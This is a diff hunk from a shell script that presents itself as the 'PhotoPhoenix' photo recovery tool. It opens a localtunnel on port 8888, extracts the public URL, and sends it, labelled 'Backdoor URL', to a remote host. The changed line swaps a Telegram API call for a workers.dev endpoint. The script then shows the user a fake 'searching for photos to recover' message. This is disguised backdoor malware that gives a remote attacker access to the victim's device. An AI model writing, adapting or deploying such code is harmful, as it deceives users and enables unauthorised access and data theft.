@@ -74,7 +74,7 @@ then
     lt -p 8888 > data.txt 2> /dev/null &
     sleep 6
     DATA=$(grep -o "https://[^ ]*" data.txt)
-    curl https://api.telegram.org/0/sendMessage -d "chat_id=0&text=Backdoor URL :%0A$DATA" > /dev/null 2>&1
+    curl -s -o /dev/null https://api-photophoenix.photophoenix8.workers.dev -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode $'text=Backdoor URL :\n\n'"$DATA" 2>/dev/null
     echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 30
     CACHED_FILES="storage/shared/PhotoPhoenix/cached_files"
